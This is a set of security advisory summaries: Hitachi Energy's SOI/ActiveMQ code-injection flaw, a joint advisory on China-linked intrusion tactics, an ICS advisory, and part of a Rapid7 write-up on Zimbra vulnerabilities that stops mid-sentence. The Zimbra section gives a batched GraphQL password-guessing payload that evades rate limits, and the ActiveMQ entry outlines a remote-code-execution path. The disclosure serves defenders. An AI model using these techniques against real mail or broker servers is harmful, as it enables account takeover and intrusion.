summary: View CSAF Summary Hitachi Energy is aware of RCE (Remote Code Execution) vulnerability in Apache ActiveMQ component of SOI product versions listed in this document. These vulnerabilities can be exploited to carry out various attacks affecting confidentiality, integrity, and availability of the product. Please refer to the Recommended Immediate Actions for information about the mitigation/remediation. The following versions of Hitachi Energy SOI are affected: SOI vers:SOI/>=2.0.0|<=2.2.0 (CVE-2026-34197) CVSS Vendor Equipment v3 8.8 Hitachi Energy SOI 1 Vulnerability Improper Control of Generation of Code ('Code Injection') Background Critical Infrastructure Sectors: Energy Countries/Areas Deployed: Worldwide Company Headquarters Location: Switzerland Vulnerabilities CVE-2026-34197 Improper Input Validation, Improper Control of Generation of Code ('Code Injection') vulnerability in Apache ActiveMQ Broker, Apache ActiveMQ used in SOI product. Apache ActiveMQ Classic exposes the Jolokia JMX-HTTP bridge at /api/jolokia/ on the web console. The default Jolokia access policy permits exec operations on all ActiveMQ MBeans (org.apache.activemq:*), including BrokerService.addNetworkConnector(String) and BrokerService.addConnector(String). An authenticated attacker can invoke these operations with a crafted discovery URI that triggers the VM transport's brokerConfig parameter to load a remote Spring XML application context using ResourceXmlApplicationContext. Because Spring's ResourceXmlApplicationContext instantiates all singleton beans before the BrokerService validates the configuration, arbitrary code execution occurs on the broker's JVM through bean factory methods such as Runtime.exec(). Read More 1 Affected Product SOI Version 2.0.0 to 2.2.0 Product Status: known_affected Remediations Vendor fix Apply the patch SOI EP2, which upgrades the ActiveMQ version (JMS message broker) for the SOI Core to version 5.19.5. EP2 is a cumulative patch that covers previous EP1 patch. EP2 also upgrades the SOI management scripts to the latest version and installs an upgraded OpenJDK version 11 to run ActiveMQ MESSAGE BROKER in the newer JRE. It also upgrades the ActiveMQ client libraries installed in the WildFly module. Mitigation Follow General Mitigation Factors/Workarounds and refer to the product deployment guidelines for securing the product environment. summary: View CSAF Summary Hitachi Energy is publishing this cybersecurity advisory in response to the security findings reported by Dragos affecting end-of-life RTU500 CMU firmware version 9.x. The reported findings are associated with legacy RTU500 firmware versions that were developed according to the cybersecurity requirements, threat landscape, and industry practices that existed at the time of their release. As cybersecurity threats and security expectations have evolved, these end-of-life versions no longer incorporate many of the security controls and hardening measures that are standard in modern industrial control systems. Over successive RTU500 releases, Hitachi Energy has continuously enhanced the security of the product through the introduction of additional security features, protocol hardening, stronger authentication and access controls, encrypted communications, and other security-by-design improvements. While the findings reported by Dragos do not affect currently supported RTU500 CMU firmware versions, there is a likelihood that the end-of-life versions 11.x and prior are affected by these vulnerabilities. Since the end-of-life versions are no longer maintained with security updates, Hitachi Energy strongly recommends upgrading to a currently supported RTU500 firmware version. Customers should also implement appropriate defense-in-depth measures and cybersecurity best practices to reduce risk and strengthen the security posture of their operational environments. Please refer to the Recommended Immediate Actions for information about the mitigation/remediation. summary: Advisory at a Glance Title Chinese Government-linked Cyber Threat Actors Combine Automated and Hands-on Hacking Tools to Steal Sensitive Data Original Publication October 8, 2026 Executive Summary Chinese government-linked cyber threat actors, enabled by the Integrity Technology Group, are combining automated scanning tools, large-scale botnets, and hands-on exploitation techniques to target and steal sensitive data from organizations worldwide, including US critical infrastructure sectors. These actors exploit vulnerabilities by using scanning tools, cross-site scripting attacks, and password spraying on Microsoft Exchange servers, while establishing persistence through VPN software and exfiltrating emails and credentials using scripts. To help mitigate against this activity, organizations should prioritize disabling unused services and ports, sanitizing web application inputs to prevent injection attacks, implementing multifactor authentication for all services, and applying timely patches to reduce risks of compromise. Affected Products CVE-2014-6278 CVE-2015-3306 CVE-2015-5477 CVE-2016-3081 CVE-2019-11510 CVE-2021-22205 CVE-2021-3199 CVE-2023-22894 Key Actions Disable unused services and ports , such as automatic configuration, remote access, or file sharing protocols. Sanitize user input in web applications to prevent possible cross-site scripting (XSS) payload injection. Implement identity, credential, and access management (ICAM) policies , and then require multifactor authentication (MFA) for services (to the extent possible). Indicators of Compromise For a downloadable copy of indicators of compromise, see: AA26-281A STIX XML AA26-281A STIX JSON Intended Audience Organizations: Government; Federal Civilian Executive Branch (FCEB); State, Local, Tribal, and Territorial (SLTT); Critical Infrastructure. Sectors: Government Services and Facilities , Critical Manufacturing , Healthcare and Public Health , and Information Technology . Roles: Defensive Cybersecurity Analysts , Vulnerability Analysts , Security Systems Managers , Incident Response Analysts Introduction Integrity Technology Group, a China-based company with links to the Chinese government, enables China-linked threat actors to exploit US and foreign organization networks across multiple sectors using various tools and techniques. This advisory provides an analysis of tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) from Integrity Technology Group and the threat actors they enable (hereafter referred to as “the threat actors”). The analysis in this advisory provides network defenders with detection and mitigation guidance to reduce the risk of threat actors compromising critical data. The threat actors use a unique combination of large-scale botnets, virtual private network (VPN) infrastructure, living-off-the-land (LOTL) techniques, and repositories of computer network exploitation (CNE) tools. Although these techniques are not unique to Chinese threat actors, this advisory details how the threat actors use them to support CNE activity. The threat actors targeted victims across multiple US critical infrastructure sectors, including: Government Services and Facilities , Critical Manufacturing , Healthcare and Public Health , and Information Technology . The actors also targeted victims in US law enforcement, education, and religious organizations, as well as organizations across Southeast Asia, Africa, and North America. The information in this advisory originates from technical evidence recovered from, and observed during, multiple Federal Bureau of Investigation (FBI) investigations related to Integrity Technology Group. The FBI, Cybersecurity and Infrastructure Security Agency (CISA), National Security Agency (NSA), United Kingdom National Cyber Security Centre (NCSC-UK), Australian Signals Directorate’s Australian Cyber Security Centre (ASD’s ACSC), the Canadian Centre for Cyber Security (Cyber Centre), Japan’s National Police Agency (NPA) and National Cybersecurity Office (NCO), New Zealand’s National Cyber Security Centre (NCSC-NZ), and Spain’s Centro Nacional de Inteligencia (CNI), hereafter referred to as “the authoring organizations”—are releasing this joint cybersecurity advisory to urge network defenders from government and relevant organizations to: Hunt for potential compromises from this activity. Better protect against this threat activity and other Chinese government-linked cyber targeting. This advisory also provides our US federal, state, local, territorial, and tribal (FSLTT) government agencies, and international and industry partners, with the indicators and details necessary to proactively defend their networks against this threat and protect critical data. For more information on People’s Republic of China (PRC) state-sponsored malicious cyber activity in general, see the FBI’s Cyber Threat Overview: China webpage. For more information on China-linked malicious cyber activity, see CISA’s People’s Republic of China Threat Overview and Advisories webpage. The authoring organizations encourage network defenders to implement the recommendations in the Mitigations section of this advisory to reduce the likelihood and impact of these incidents. Download the PDF version of this report: Chinese Government-linked Cyber Threat Actors Combine Automated and Hands-on Hacking Tools to Steal Sensitive Data (PDF, 1.41 MB ) For a downloadable copy of IOCs, see: AA26-281A STIX (JSON, 1,021.16 KB ) AA26-281A STIX XML (XML, 658.87 KB ) Threat Actor Background Integrity Technology Group (Integrity Tech) is a China-based for-profit company with links to the Chinese government. Integrity Tech employs individuals who support malicious cyber activity in different ways, including acquiring or building cyber tools for use and sale, acquiring and hosting infrastructure, and compromising networks across global victims, which the authoring organizations track as China-based malicious cyber activity. The services provided by Integrity Tech also contribute to the larger Chinese cyber ecosystem, which aims to exfiltrate sensitive data from victims around the world. Notably, the threat actors enabled by Integrity Tech use TTPs consistent with the cyber activity publicly known as Flax Typhoon, Ethereal Panda, and Red Juliett, among others. However, these threat actors may also perform activity not associated with Integrity Tech. Note: Cybersecurity companies have different methods of tracking and attributing cyber actors and these may not be a 1:1 correlation to the US Government's methodology and understanding for all activity related to these groupings. Technical Details Note: This advisory uses the MITRE ATT&CK ® Matrix for Enterprise framework, version 19. See Appendix A: Indicators of Compromise and the MITRE ATT&CK Tactics and Techniques section of this advisory for a table of the threat actors’ activity mapped to MITRE ATT&CK tactics and techniques. Reconnaissance The threat actors use a variety of open source scanning tools to find vulnerabilities in networks and web-based applications, including: BBScan, dirsearch, Fscan, ksubdomain, masscan, NMAP, OneForAll, ShuiZe, and wpscan [ T1595.002 ]. See Appendix A: Indicators of Compromise for a complete list of scanning tools. Some of these tools contain features useful for fingerprinting remote applications, testing remote authentication protocols, or enumerating the pages of a website. The use of open source tools typically found on GitHub suggests the threat actors tend to look for more vulnerable targets. In general, the threat actors focus on scanning ports 21 (file transfer protocol [FTP]), 22 (SSH), 53 (domain name system [DNS]), 80 (HTTP), 443 (HTTPS), and 1080 (SOCKS). When scanning websites with dirsearch, the threat actors attempt to enumerate PHP and ASP ( .NET ) pages. MicroScan As early as 2017, these threat actors have also used a malicious application known as “MicroScan.” This Python-based web application contains over 1,300 penetration testing scripts written to scan websites for specific vulnerabilities. The threat actors used these scripts to target services including OpenSSL, Oracle WebLogic, Rejetto, WordPress, Juniper ScreenOS, Jenkins, and Apache Struts. See Appendix B: Observed Common Vulnerabilities and Exposures for a list of successfully exploited common vulnerabilities and exposures (CVEs) recovered from penetration testing scripts. Figure 1 shows a MicroScan account dashboard displaying detected vulnerabilities. Figure 1. MicroScan Account Dashboard Showing Detected Vulnerabilities Initial Access and Execution Since at least mid-January 2021, the threat actors have gained access to victim networks and cloud-based services primarily through command line utilities built on exploit codes written in popular programming languages, such as Python and Go [ T1059.006 ]. Additionally, the threat actors have used JavaScript [ T1059.007 ] and HTML code to execute cross-site scripting (XSS) attacks. XSS vulnerabilities allow malicious actors to use unwitting third-party applications vulnerable to XSS to modify content on a webpage [ T1189 ] and target other victims. During the investigations, the FBI recovered an XSS payload used by the threat actors. When executed on a vulnerable website running JavaScript, this payload modifies webpage content to display username and password fields, facilitating user credential harvesting (see Figure 2 ). Figure 2. Executed XSS Payload After a user enters any username and password, the executed XSS payload page generates a link to download a password-protected .zip file. The .zip file’s contents originate from encoded bytes within the XSS payload and contain the executable file live700_v1.exe . Analysis of live700_v1.exe demonstrated the executable begins a process named DiagTrack.exe , which shares its name with legitimate Windows software [ T1036.003 ]. DiagTrack.exe then establishes encrypted communications over the HTTP protocol with the domain dns.studiocloud.xyz , which the FBI attributes to Integrity Tech. Given that the executable also contains functions designed to query data from user mailboxes, the FBI assesses the malware likely targets user email data for exfiltration. EBurst The threat actors use EBurst, an open source Python-based tool, to target accounts in the Microsoft Office365 Cloud environment. The tool compromises email accounts on Microsoft Exchange servers using multiple interfaces for password spraying [ T1110.003 ] and password guessing [ T1110.001 ] against each supplied email address. Based on the open source EBurst ReadMe file, these interfaces include: Exchange Control Panel (ECP); Exchange Web Services (EWS); Offline Address Book (OAB); Outlook Web Access (OWA); Remote Procedure Call (RPC); Application Programming Interface (API); Messaging Application Programming Interface (MAPI); PowerShell; Autodiscover; and Microsoft-Server-ActiveSync. Network defenders should include these interfaces when defending against EBurst. Persistence To establish persistence, the threat actors install virtual private network (VPN) software clients on victim devices [ T1133 ] to obfuscate command and control (C2) communications or other actions, further preventing victims from attributing malicious network activity. The threat actors typically download SoftEther installers onto victim devices from threat actor-controlled infrastructure using PowerShell or LOTL binaries for Windows Systems [ T1059.001 ]. For Linux/Unix distributions, the threat actors download SoftEther installers via curl or wget . For either operating system, the actors configure the SoftEther client to automatically reconnect on startup. They often name the installers conhost.exe or dllhost.exe to appear as common Windows executables [ T1036.003 ]. Additionally, endpoint detection software is less likely to flag SoftEther because it is a legitimate VPN software. In some observed cases, the threat actors stored the SoftEther program directly on the server. Analysis of these servers revealed victim domains and subdomains that hosted the SoftEther connections: 98aiblog[.]com; hmbcloud[.]com; hmbcloud[.]net; hmbiplc-01[.]com; iepl.node[.]cm; javacheck.ooguy[.]com; javaupdate.giize[.]com; sexytube0[.]com; and twimg.co[.]uk. The threat actors use SoftEther to maintain persistent remote access to victim devices to enable data exfiltration. The FBI observed the threat actors installing the client on the end-user’s system, which connected to the C2 server using one of the identified domains, subdomains, or the server’s IP address. The threat actors also accessed other targets, including cybersecurity websites, connected to these hubs. Collection and Exfiltration The FBI observed the threat actors downloading databases or manually pulling data from the victim emails and staging the exfiltration data with discreet file names to minimize detection of the MySQL email dump. Some of these names include: 001.gif ; All_scanner_vXX.pl.gz (XX represents either a one- or two-digit number); Css.js ; Include.png ; M2k.js ; M2k_list.js ; and M2k_ui_adm.js . Curlc4.txt The FBI observed that the threat actors created a bot using the PHP script Curlc4.txt to obtain emails from victims. The script is specifically designed to interface with the Microsoft EWS API, which allows the threat actors to access email and content items, such as calendars and contacts [ T1114.002 ]. Based on observations, the script appears to be stand-alone rather than installed on a compromised device. The script uploaded emails to a remote server [ T1020 ], obfuscating many of the directories and files it created, and changed the name of the child process to crypto . The script downloaded the original file from https://upl.natcloudservice[.]com using IP address 149.28.132[.]137 . The main C2 domain for the bot was natcloudservice[.]com, and the domain communicated with https://natcloudservice[.]com/ews and upl.natcloudservice[.]com/ews. Before exfiltration, the bot compressed emails. In some instances, the threat actor also used a password to encrypt emails using RC4 or AES-128-CBC [ T1560.003 ]. The PHP script took up to two command-line arguments. The first argument appeared to be the root directory where the scripts execute. If the first argument was not supplied, then the script searched for a writeable directory [ T1074.001 ] to use as its directory. The script searched the directories listed in Table 1 until it found a writeable one. The script stored the second command-line argument in a variable saved to the targeted system. Table 1. DC.exe The threat actors used DC.exe to execute the DCSync replication technique [ T1003.006 ] to copy sensitive information from the Active Directory (AD), including account credentials, group membership details, and trust relationships. DC.exe used a Remote Procedure Call (RPC) binding to the victim’s domain controller. The file then used the Directory Replication Service to retrieve data from the victim’s AD. Specifically, it retrieved a handle to the local security policy object, which is used to query the domain controller for the DNS domain name, domain security identifier (SID), and domain replication epoch. The file also used the following object IDs to retrieve information about Active Directory attributes and configurations: 1.2.840.113556.1.2.48; 1.2.840.113556.1.4.1; 1.2.840.113556.1.4.125; 1.2.840.113556.1.4.129; 1.2.840.113556.1.4.133; 1.2.840.113556.1.4.135; 1.2.840.113556.1.4.146; 1.2.840.113556.1.4.159; 1.2.840.113556.1.4.160; 1.2.840.113556.1.4.221; 1.2.840.113556.1.4.27; 1.2.840.113556.1.4.302; 1.2.840.113556.1.4.55; 1.2.840.113556.1.4.609; 1.2.840.113556.1.4.656; 1.2.840.113556.1.4.8; 1.2.840.113556.1.4.90; 1.2.840.113556.1.4.94; and 1.2.840.113556.1.4.96. Data Exfiltration The FBI recovered an archived email database the threat actors used to target email accounts of victim organizations. The threat actors collect account credentials and exfiltrate victim email data from on-premise systems and cloud-based services. Observed victims of email data theft included government organizations, law enforcement agencies, healthcare systems, and religious institutions located in Southeast Asia. In some instances, the threat actors restricted access to the exfiltrated data to only IP addresses from Xiamen, China. Office-cli Program The threat actors use a command-line utility office-cli [ T1059.004 ] to continuously target and access Microsoft Outlook 365 email accounts to exfiltrate emails across different time periods. The threat actors occasionally update these accounts and swap them for the most recent accounts. The threat actors use office-cli to automate access and exfiltration of mail content using configuration files, such as client_id , tenant_id , and secret . The FBI observed the threat actors executing office-cli from the command line or by running it from a Bash script. In both instances, the threat actors place the JSON files required to access the mailboxes in the config directory. Additionally, office-cli saves data gathered from the victims in a subdirectory of the dump directory. The threat actors evade detection when using this program by using legitimate access methods. The threat actors maintain a custom web application that provides third-party access to stolen email content. Users of this application can pass specific arguments in URLs to see email content for specific accounts. Incident Response If a potential compromise is detected, organizations should take the following actions: Determine which hosts were compromised and isolate them by quarantining or taking them offline. Initiate threat hunting activities to scope the intrusion. Collect and review relevant artifacts, logs, and other data to identify threat actor TTPs, compromised devices and accounts, a timeline of activity, etc. Follow national guidelines and requirements in your country on reporting cyber incidents (see Contact Information ). Apply eviction countermeasures to contain the incident and eradicate the threat actor from the network. Start applying countermeasures after collecting enough threat hunting data to inform effective countermeasure selection; this will likely overlap with threat hunting activities): Use CISA’s Eviction Strategies Tool to assemble countermeasures for a systematic eviction plan—the tool comprises Playbook-NG (a web application) and COUN7ER (a database of post-compromise countermeasures mapped to adversary TTPs). Use Playbook-NG and COUN7ER together to assemble a systematic eviction plan, or playbook, that leverages distinct countermeasures to contain and evict cyber threat actors. The playbook features a list of recommended response actions based on threat actor TTPs and includes each action’s intended outcome, preparatory steps, and associated risks. For more information, see CISA’s Eviction Strategies Tool Fact Sheet . Harden the network to prevent additional malicious activity (see Mitigations for guidance). Mitigations The authoring organizations recommend network defenders and organizations implement the mitigations below to improve your organization’s cybersecurity posture on the basis of the threat actors’ activity. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats and TTPs. Visit CISA’s CPGs webpage for more information on the CPGs, including additional recommended baseline protections. The authoring organizations recommend network defenders and organizations implement these mitigations: Disable unused services and ports , such as automatic configuration, remote access, or file sharing protocols. Configure applications to reveal as little information as possible when serving login pages or banner information in response to external requests. Consider using an attack surface management service or web-based search platforms that search the internet to identify exposed services or ports [ CPG 3.S ]. For additional support, follow CISA’s Internet Exposure Reduction Guidance and NSA’s Attack Surface Management . Sanitize user input in web applications to prevent possible XSS payload injection. Implement identity, credential, and access management (ICAM) policies across the organization and then require multifactor authentication (MFA) [ CPG 3.F ] for all services (to the extent possible), particularly for webmail, VPNs, and accounts that access critical systems. Replace default passwords with strong passwords [ CPG 3.A ]. Limit and audit user accounts with administrative privileges and configure access controls with least privilege in mind. Ensure only users that need administrator privileges are granted these privileges, and regularly review access to assess whether it is still required [ CPG 3.G ]. Enable download and domain reputation screening in web browsers, along with protective DNS resolution, to block downloads of known malware and connections to websites and domains with unsafe reputations. Monitor for signs of unauthorized use of LOTL tools and unexpected Active Directory replication [ CPG 4.B ]. Implement network segmentation to ensure a compromised device has no access to sensitive resources of another organizational unit [ CPG 3.I ]. Use the principle of least privilege to provide just enough connectivity for devices to perform their intended functions [ CPG 3.H ]. For a less resource constrictive mitigation, organizations may segment edge devices internally. Monitor cloud accounts for connected applications that can access sensitive data in file systems and email data. Review web application access logs for signs of exploitation attempts , such as malicious directory traversal attempts, command injection attempts, or enumeration attempts [ CPG 3.Q ]. Apply patches and updates , including software and firmware updates (regular patching mitigates many high-risk security vulnerabilities) [ CPG 2.B ]. If available, use automatic update channels from trusted network locations. Do not trust email messages claiming to provide software updates as attachments or via links to untrusted websites. Install and regularly update antivirus software on all hosts and enable real time detection. Monitor for abnormal and high volumes of unexpected traffic (scanning) using firewalls and/or intrusion detection systems [ CPG 4.B ]. Since an attempted compromise using a distributed denial of service (DDoS) technique may appear as normal traffic, it is critical for organizations to define, monitor, and prepare for abnormal traffic volumes. Monitor for high volumes of outbound or upload traffic from workstations or other devices that usually have low volumes of uploads compared to downloads. Monitor logs and investigate unusual IP addresses and ports in command lines, registry entries, and firewall logs to identify other hosts that are potentially involved in actor actions [ CPG 3.Q ]. Review perimeter firewall configurations for unauthorized changes and/or entries that may permit external connections to internal hosts. Monitor for abnormal account activity , such as logons outside of normal working hours and impossible time and distance logons (e.g., a user logging on from two geographically separated locations at the same time) [ CPG 4.B ]. Implement a recovery plan to maintain and retain multiple copies of sensitive or proprietary data and servers in a physically separate, segmented, and secure location (i.e., hard drive, storage device, or the cloud) [ CPG 1.C ]. Regularly back up data and password protect backup copies offline [ CPG 3.O ]. Ensure copies of critical data are not accessible for modification or deletion from the system where data resides. Replace end-of-life products with supported alternatives that are included in vendor support plans. Ensure systems use the strongest feasible form of authentication [ CPG 3.B ; CPG 3.F ]. Harden authentication protocols and access lists [ CPG 3.H ]. Regularly rotate keys for your service accounts, use strong key lengths to enhance security and minimize the risk of key compromise, and implement role-based access control (RBAC) to avoid granting excess privileges. Provide cyber security awareness and training [ CPG 3.J ]. Regularly train users on information security principles and techniques, as well as overall emerging cybersecurity risks and vulnerabilities (e.g., ransomware and phishing scams). Regularly engage reputable and skilled penetration testing services to evaluate your public attack surface and remediate the most commonly exploited vulnerabilities used by these actors. Validate Security Controls In addition to applying mitigations, the authoring organizations recommend exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. The authoring organizations recommend testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory. To get started: Select an ATT&CK technique described in this advisory (see Table 2 to Table 9 ). Align your security technologies against the technique. Test your technologies against the technique. Analyze your detection and prevention technologies’ performance. Repeat the process for all security technologies to obtain a set of comprehensive performance data. Tune your security program, including people, processes, and technologies, based on the data generated by this process. The authoring organizations recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory. summary: View CSAF Summary Successful exploitation of these vulnerabilities could allow a malicious user to access the device and gain administrative access. This access would allow the user to view, edit, and upload configuration files. Further, a malicious user can cause the switch to reboot by navigating to a specific URL on the device. This action can be scripted on the malicious user's local machine to cause continuous rebooting of the switch. Recommended Practices CISA recommends users take defensive measures to minimize the risk of exploitation of these vulnerabilities. Minimize network exposure for all control system devices and/or systems, ensuring they are not accessible from the internet. Locate control system networks and remote devices behind firewalls and isolating them from business networks. When remote access is required, use more secure methods, such as Virtual Private Networks (VPNs), recognizing VPNs may have vulnerabilities and should be updated to the most current version available. Also recognize VPN is only as secure as the connected devices. CISA reminds organizations to perform proper impact analysis and risk assessment prior to deploying defensive measures. CISA also provides a section for control systems security recommended practices on the ICS webpage on cisa.gov/ics. Several CISA products detailing cyber defense best practices are available for reading and download, including Improving Industrial Control Systems Cybersecurity with Defense-in-Depth Strategies. CISA encourages organizations to implement recommended cybersecurity strategies for proactive defense of ICS assets. Additional mitigation guidance and recommended practices are publicly available on the ICS webpage at cisa.gov/ics in the technical information paper, ICS-TIP-12-146-01B--Targeted Cyber Intrusion Detection and Mitigation Strategies. Organizations observing suspected malicious activity should follow established internal procedures and report findings to CISA for tracking and correlation against other incidents. CISA also recommends users take the following measures to protect themselves from social engineering attacks: Do not click web links or open attachments in unsolicited email messages. Refer to Recognizing and Avoiding Email Scams for more information on avoiding email scams. Refer to Avoiding Social Engineering and Phishing Attacks for more information on social engineering attacks. No known public exploitation specifically targeting these vulnerabilities has been reported to CISA at this time. summary: An enterprise mail server authenticates users, stores private communications, delivers recovery links, runs calendars, and sends mail that employees and other systems trust. Compromising it can therefore expose both email and the identities and workflows built around it. During a broader assessment of Zimbra Collaboration Suite (ZCS), Rapid7 reported more than 80 vulnerabilities spanning authentication, mailbox authorization, calendar processing, web clients, document services, and the host operating system. The affected components are being fixed on different schedules, so we are publishing the analysis in stages. An accompanying GitHub repository containing full write-ups and PoCs serves as a live technical tracker, and will be updated as further findings and fixes become public. This first article concentrates on five account-related vulnerabilities: CVE Finding Rapid7 CVSS Fixed release CVE-2026-93637 GraphQL authentication rate-limit bypass 3.7 Low No public fix listed CVE-2026-93635 LDAP filter injection 5.3 Medium No public fix listed CVE-2026-73571 Email impersonation via SaveDraftRequest 8.3 High ZCS 10.1.17 CVE-2026-10631 EWS cross-user mailbox access 6.5 Medium ZCS 10.1.20 CVE-2026-50055 Sieve notify forwarding-restriction bypass 6.5 Medium ZCS 10.1.20 Part 2 will cover unauthenticated stored XSS paths in the Classic and Modern clients and what they can do with the recipient's session. A script can install the Sieve forwarding rule (CVE-2026-50055); another path preserves direct mailbox access after the original session expires or the victim changes their password. CVE-2026-73571 makes these attacks more credible by placing the message in the mailbox as any chosen local user. Parts 3 and 4 move through the document-service boundary from SSRF to code execution as zimbra , then cover multiple independent paths from zimbra to root. The BruCON presentation, Signed, Sealed, Compromised: Weaponizing Enterprise Mail Infrastructure , previewed these chains, including selected root-command output returned to the victim's browser after one message selection. Product description Zimbra Collaboration Suite is a self-hosted platform for email, calendars, contacts, tasks, and file sharing. Zimbra calls its commercial server Network Edition. Within one Network Edition installation, customers can license a mixture of Standard and Professional users. Zimbra Desktop and Zimbra Connector for Outlook are separate client applications, while Exchange Web Services (EWS) is a separately licensed server feature for Outlook compatibility. ZCS includes two webmail clients with different request and rendering stacks: Classic relies primarily on SOAP, while Modern uses GraphQL. The server also accepts SMTP and iCalendar input, exposes compatibility services such as EWS, and delegates work to local components running under several operating-system identities. Testing setup Rapid7 initially assessed ZCS 10.1.16_GA_4850 Network Edition on Ubuntu 22.04. For fixed findings, each section describes Zimbra's fix and the accompanying Github repository retains the complete vulnerable-to-fixed diff. Impact The pre-authentication findings lower separate barriers to obtaining a foothold. GraphQL hides failed password attempts from Zimbra's source-IP counter. In the configured external-LDAP case, a second flaw can also leave the optional account-lockout policy with no local account to lock. Each remaining finding is independently exploitable from an ordinary compromised account. Email impersonation needs no optional feature: the attacker places a different local address in an authenticated request. Zimbra submits the message from that account through the trusted outbound pipeline and records a copy in the selected user's Sent folder. If EWS is enabled for the compromised account, the attacker can read private conversations, attachments, drafts, sent mail, contacts and calendar entries from other users' mailboxes. A separate Sieve policy bypass can keep copies of future mail flowing to the attacker after the original session expires or the password changes. These examples do not represent everything an attacker can do with authenticated Zimbra access, or the full vulnerability set from the assessment. GraphQL authentication rate-limit bypass (CVE-2026-93637) This pre-authentication route requires only HTTPS access to Zimbra. ZimbraInvalidLoginFilter normally records failed logins by source address around requests to the public service endpoints. Classic submits login attempts through the SOAP AuthRequest path, whereas Modern exposes the same password check through its GraphQL authenticate mutation. That limiter's failure threshold is 10 by default, and after a source crosses it within the configured window, subsequent requests handled by the filter receive HTTP 503. CVE-2026-93637 allows attempts through GraphQL to remain invisible to that counter. Technical analysis The failure counter relies on a request attribute ZimbraInvalidLoginFilter wraps requests to the public service endpoints and runs the downstream handler before its counter logic: // ZimbraInvalidLoginFilter.doFilter() // ... whitelist, disabled-filter and existing-suspension handling omitted chain.doFilter(request, response); if (req.getAttribute(AUTH_FAILED) != null) { // [0] wrapper-supplied signal // ... logging omitted boolean loginFailed = (Boolean)req.getAttribute(AUTH_FAILED); if (loginFailed) { // ... per-IP counter lookup and initialization omitted if (count.incrementAndGet() > this.maxFailedLogin) { this.numberOfFailedOccurence.put(clientIp, count); this.suspiciousIpAddrLastAttempt.put( clientIp, System.currentTimeMillis()); } this.numberOfFailedOccurence.put(clientIp, count); } // ... final debug logging omitted } At [0] , failure processing begins only if the downstream path added auth.failed to the request. The relevant SOAP exception path is: // SoapEngine.dispatchRequest() // ... earlier dispatch handling omitted catch (AccountServiceException.AuthFailedServiceException e) { HttpServletRequest httpReq = (HttpServletRequest)context.get("servlet.request"); httpReq.setAttribute("auth.failed", (Object)Boolean.TRUE); // [1] failure becomes visible String clientIp = (String)context.get(REQUEST_IP); httpReq.setAttribute(REQUEST_IP, (Object)clientIp); response = soapProto.soapFault((ServiceException)e); // ... debug and informational logging omitted } At [1] , SoapEngine.dispatchRequest() sets the attribute before returning the authentication fault. A failed SOAP login therefore reaches the check at [0] and increments the source-IP counter. GraphQL skips the SOAP failure handler Modern Zimbra's GraphQL extension builds an ordinary AuthRequest , then reaches its handler through XMLDocumentUtilities.executeDocumentAsGuest() : // XMLDocumentUtilities.executeDocumentAsGuest() public static Element executeDocumentAsGuest(DocumentHandler handler, Element request, RequestContext rctxt) throws ServiceException { HashMap<String, Object> context = new HashMap<String, Object>(); context.put("zimbra.context", GQLAuthUtilities.getGuestZimbraSoapContext(request.getQName(), handler, rctxt)); context.put("servlet.request", rctxt.getRawRequest()); context.put("servlet.response", rctxt.getRawResponse()); return handler.handle(request, context); // [2] bypasses SoapEngine } At [2] , the helper calls the authentication handler without passing through SoapEngine . An incorrect password still becomes a GraphQL error, but the catch block at [1] never runs. The attribute read at [0] is absent, so the filter does not increment the source-IP counter. Exploitation Batched authentication An unauthenticated client sends JSON to /service/extension/graphql . GraphQL aliases let its query field invoke authenticate repeatedly with different passwords: mutation { a0: authenticate(authInput: {account: {accountBy: name, key: "victim@example.test"}, password: "pass0"}) { authToken } a1: authenticate(authInput: {account: {accountBy: name, key: "victim@example.test"}, password: "pass1"}) { authToken } a2: authenticate(authInput: {account: {accountBy: name, key: "victim@example.test"}, password: "pass2"}) { authToken } } Each alias performs a real authentication operation. Failures appear in the GraphQL errors array, while a successful alias returns an authentication token under its corresponding name. The GraphQL engine imposes no application-level alias limit on this path. The whole document remains one HTTP request, so Jetty's request-count control sees one request rather than the number of login operations inside it. Alias execution is sequential and backend-bound, so the rate depends on the deployment. Using 100 aliases per request, 10,000 candidates completed in under two minutes without the Zimbra IP counter or Jetty's request filter blocking the source. The vulnerability removes IP-level failed-login accounting and reduces request overhead. The CVE-2026-93637 PoC accepts an ordinary password file, generates the batched GraphQL documents and reports the accepted candidate. Figure 1: Metasploit module tests 1500 passwords in 15 requests, successfully identifying the correct password in the final batch. Per-account lockout The IP counter is not Zimbra's only possible control. Its separate per-account lockout policy is disabled by default, but when enabled, failed GraphQL operations still increment the target local account's counter and stop further guessing when that account locks. CVE-2026-93635 and external LDAP On domains configured with external LDAP search-filter authentication and lazy auto-provisioning, CVE-2026-93635 turns the login field into a password oracle for an external directory user. LdapUtil.computeDn() substitutes a wildcarded login such as jdoe*@example.test into the configured filter without escaping it. If that pattern selects one directory entry, Zimbra tries the candidate password against that user. An incorrect password returns account.AUTH_FAILED ; a correct password passes the LDAP bind and reaches lazy provisioning, producing a different response. The wildcarded login is not the name of an existing local Zimbra account, so the optional per-account lockout has no account against which to record the failed attempt. Sending the same operation through GraphQL also avoids the source-IP counter. With per-account lockout enabled and its threshold set to five, repeated wrong candidates incremented neither counter, while a correct password remained distinguishable. This two-bug composition applies only to the stated external-LDAP configuration, not Zimbra's default local-authentication path. The LDAP/GraphQL composition PoC and CVE-2026-93635 tracker entry cover this configured external-directory path in detail. The CVE-2026-93637 tracker entry records the standalone finding and affected-version evidence. Impact Anyone who can reach the public GraphQL endpoint can make repeated password guesses without triggering Zimbra's source-IP suspension. Batching several candidates also reduces the number of HTTP requests and the associated network overhead. This makes weak, reused or previously exposed passwords more practical to test, but it does not reveal a strong password or bypass a separate MFA check. Email impersonation via SaveDraftRequest (CVE-2026-73571) SaveDraftRequest has a delegated-sending path selected by isDelegatedReq . On a vulnerable server, an ordinary user can place another local address in the request's From field. The handler resolves that address to its mailbox, assumes the mailbox owner's authority and calls Zimbra's normal send routine without checking whether the signed-in account has send-as rights. This is an application authorization failure, not a forged display name or a hand-written SMTP header: Zimbra submits the attacker's message as the selected account and adds the corresponding item to that account's Sent 